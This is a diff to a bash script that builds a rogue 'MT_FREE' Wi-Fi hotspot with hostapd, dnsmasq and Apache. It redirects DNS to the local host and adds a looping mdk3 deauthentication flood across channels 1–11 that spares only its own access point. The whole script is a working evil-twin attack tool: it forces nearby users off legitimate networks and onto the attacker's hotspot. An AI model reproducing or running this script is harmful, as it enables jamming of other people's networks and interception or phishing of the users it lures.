@@ -1,17 +1,24 @@
 #!/bin/bash
 
-CURRENT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
-INTERNET_IFACE="eth0"
-AP_IFACE="wlan0"
-AP_ESSID="FREE_WIFI"
+INTERNET_IFACE="eth1"
+AP_IFACE="wlan1"
+MDK3_IFACE="wlan2"
+
+AP_ESSID="MT_FREE"
 AP_CHANELL="1"
 AP_IP="192.168.100.1"
 AP_MASK="24"
+
 DHCP_FIRST="192.168.100.10"
 DHCP_LAST="192.168.100.250"
 DHCP_MASK="255.255.255.0"
 RESOLVE_SERVER_1="1.1.1.1"
 RESOLVE_SERVER_2="1.0.0.1"
+
+DEAUTH_CHANNEL="1,2,4,7,8,9,10,11"
+
+CURRENT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
+LOG_DIR="/var/log"
 
 BLUE='\033[1;34m'
 RED='\033[1;31m'
@@ -53,6 +60,17 @@ done
 
 while true
 do
+	if ip link show | grep "${MDK3_IFACE}" >/dev/null 2>&1; then
+		echo -e "${SUCESS}Interface ${MDK3_IFACE} exist!";
+		break
+	else
+		echo -e "${ERROR}Interface ${MDK3_IFACE} not found, wait..."
+		sleep 10
+fi
+done
+
+while true
+do
 	dhclient ${INTERNET_IFACE} >/dev/null 2>&1
     if ifconfig ${INTERNET_IFACE} | grep "inet " >/dev/null 2>&1; then
         echo -e "${SUCESS}Interface ${INTERNET_IFACE} is configured.";
@@ -67,11 +85,16 @@ ifconfig ${AP_IFACE} down
 ifconfig ${AP_IFACE} ${AP_IP}/${AP_MASK}
 ifconfig ${AP_IFACE} up
 
+ifconfig ${MDK3_IFACE} down
+iwconfig ${MDK3_IFACE} mode monitor
+ifconfig ${MDK3_IFACE} up
+
 # Check installed programs
 if ! dpkg --list | grep -qe "ii\s*apache2 "; then apt -y -qq install apache2; fi
 if ! dpkg --list | grep -qe "ii\s*libapache2-mod-security2 "; then apt -y -qq install libapache2-mod-security2; fi
 if ! dpkg --list | grep -qe "ii\s*hostapd "; then apt -y -qq install hostapd; fi
 if ! dpkg --list | grep -qe "ii\s*dnsmasq "; then apt -y -qq install dnsmasq; fi
+if ! dpkg --list | grep -qe "ii\s*mdk3 "; then apt -y -qq install mdk3; fi
 
 # IP forward
 iptables -t nat -F
@@ -122,7 +145,7 @@ do
     then
         sleep 10
     else
-        /usr/sbin/hostapd ${CURRENT_DIR}/hostapd.conf -B -f /var/log/hostapd.log
+        /usr/sbin/hostapd ${CURRENT_DIR}/hostapd.conf -B -f ${LOG_DIR}/hostapd.log
     fi
 done &
 
@@ -131,11 +154,17 @@ cat >${CURRENT_DIR}/dnsmasq.conf <<EOD
 server=${RESOLVE_SERVER_1}
 server=${RESOLVE_SERVER_2}
 interface=${AP_IFACE}
+bind-interfaces
+domain-needed
+bogus-priv
+domain=local.net
+expand-hosts
+local=/local.net/
 dhcp-range=${DHCP_FIRST},${DHCP_LAST},${DHCP_MASK},12h
 dhcp-option=3,${AP_IP}
 dhcp-option=6,${AP_IP}
 log-queries
-log-facility=/var/log/dnsmasq.log
+log-facility=${LOG_DIR}/dnsmasq.log
 EOD
 
 echo -n "address=/" >> ${CURRENT_DIR}/dnsmasq.conf
@@ -157,5 +186,21 @@ do
         sleep 10
     else
         /usr/sbin/dnsmasq -C ${CURRENT_DIR}/dnsmasq.conf
+    fi
+done &
+
+# MDK3 settings
+cat /sys/class/net/${AP_IFACE}/address > ${CURRENT_DIR}/whilelist.txt
+
+chmod 666 ${CURRENT_DIR}/whilelist.txt
+kill -9 $(pgrep mdk3) 2>/dev/null
+
+while true
+do
+    if pgrep -x "mdk3" > /dev/null
+    then
+        sleep 10
+    else
+        /usr/sbin/mdk3 ${MDK3_IFACE} d -w ${CURRENT_DIR}/whilelist.txt -c ${DEAUTH_CHANNEL} >${LOG_DIR}/mdk3.log 2>&1 &
     fi
 done &
